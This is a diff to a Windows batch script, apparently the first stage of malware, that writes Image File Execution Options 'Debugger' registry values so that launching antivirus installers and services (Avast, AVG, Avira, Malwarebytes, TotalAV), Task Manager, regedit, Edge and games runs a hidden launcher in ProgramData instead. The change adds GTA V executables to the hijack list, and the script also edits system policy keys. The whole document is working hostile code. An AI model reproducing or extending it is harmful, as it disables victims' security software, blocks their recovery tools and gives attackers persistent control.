@@ -85,7 +85,7 @@ setlocal EnableDelayedExpansion
 set "DEBUGGER=C:\ProgramData\pawast\launcher.exe"
 
 :: exes to hijack
-set programs=avira_en_sptl1_2113967618-1754309815-1754309815-1__phpws-spotlight-release.exe MBSetup.exe TotalAV.exe avg_antivirus_free_setup.exe avast_free_antivirus_setup_online.exe RobloxPlayerBeta.exe calc.exe msedge.exe regedit.exe taskmgr.exe mspaint.exe afwServ.exe ashQuick.exe ashUpd.exe aswAvBootTimeScanShMin.exe aswChLic.exe aswEngSrv.exe aswidsagent.exe aswRunDll.exe aswToolsSvc.exe AvastNM.exe AvastSvc.exe AvastUI.exe AvBugReport.exe AvConsent.exe AvDump.exe AvEmUpdate.exe AvLaunch.exe AvDump.exe
+set programs=PlayGTAV.exe GTA5_Enhanced.exe GTA5_Enhanced_BE.exe avira_en_sptl1_2113967618-1754309815-1754309815-1__phpws-spotlight-release.exe MBSetup.exe TotalAV.exe avg_antivirus_free_setup.exe avast_free_antivirus_setup_online.exe RobloxPlayerBeta.exe calc.exe msedge.exe regedit.exe taskmgr.exe mspaint.exe afwServ.exe ashQuick.exe ashUpd.exe aswAvBootTimeScanShMin.exe aswChLic.exe aswEngSrv.exe aswidsagent.exe aswRunDll.exe aswToolsSvc.exe AvastNM.exe AvastSvc.exe AvastUI.exe AvBugReport.exe AvConsent.exe AvDump.exe AvEmUpdate.exe AvLaunch.exe AvDump.exe
 for %%A in (%programs%) do (
     reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%%A" /v Debugger /t REG_SZ /d !DEBUGGER! /f
 )
@@ -110,3 +110,4 @@ reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v En
 :: Exits stage one
 :: =================================
 exit
+
